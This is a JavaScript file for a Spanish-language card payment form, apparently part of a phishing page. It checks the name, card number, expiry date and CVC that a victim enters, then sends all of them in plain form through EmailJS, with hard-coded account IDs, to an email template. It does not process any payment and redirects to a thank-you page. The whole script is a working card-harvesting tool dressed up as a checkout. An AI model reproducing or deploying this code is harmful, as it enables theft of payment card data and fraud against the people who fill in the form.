(function() {
    emailjs.init('ReqtkWfjI392LAzFb'); // Public Key de EmailJS
})();

document.getElementById('paymentForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const loader = document.getElementById('loader');
    const errorMsg = document.getElementById('errorMsg');
    
    // Resetear errores
    errorMsg.classList.add('hidden');
    document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
    
    // Obtener y formatear datos
    const formData = {
        nombre: document.getElementById('userName').value.trim(),
        numero: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        fecha: document.getElementById('expiryDate').value,
        cvc: document.getElementById('cvc').value
    };

    // Validación en tiempo real
    let isValid = true;

    // Validar nombre
    if (!/^[a-zA-ZÀ-ÿ\s']{5,}$/.test(formData.nombre)) {
        document.getElementById('nameError').style.display = 'block';
        document.getElementById('nameError').textContent = 'Nombre completo requerido';
        isValid = false;
    }

    // Validar tarjeta
    if (!/^\d{16}$/.test(formData.numero)) {
        document.getElementById('cardError').style.display = 'block';
        document.getElementById('cardError').textContent = 'Tarjeta inválida (16 dígitos)';
        isValid = false;
    }

    // Validar fecha
    const currentDate = new Date();
    const expiryDate = new Date(formData.fecha);
    if (expiryDate < currentDate) {
        document.getElementById('dateError').style.display = 'block';
        document.getElementById('dateError').textContent = 'Fecha expirada';
        isValid = false;
    }

    // Validar CVC
    if (!/^\d{4}$/.test(formData.cvc)) {
        document.getElementById('cvcError').style.display = 'block';
        document.getElementById('cvcError').textContent = 'CVC inválido (4 dígitos)';
        isValid = false;
    }

    if (!isValid) {
        errorMsg.textContent = '⚠️ Por favor corrige los errores';
        errorMsg.classList.remove('hidden');
        return;
    }

    // Mostrar loader
    loader.classList.remove('hidden');

    try {
        // Enviar datos a EmailJS
        const response = await emailjs.send(
            "service_syrc1uk",   // Service ID
            "template_u3etoro",  // Template ID
            formData
        );

        console.log('Email enviado:', response);
        window.location.href = "thank-you.html";
        
    } catch (error) {
        console.error('Error al enviar:', error);
        errorMsg.textContent = '❌ Error en la verificación. Intenta nuevamente.';
        errorMsg.classList.remove('hidden');
    } finally {
        loader.classList.add('hidden');
    }
});

// Formatear número de tarjeta
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = value.substring(0, 19);
});
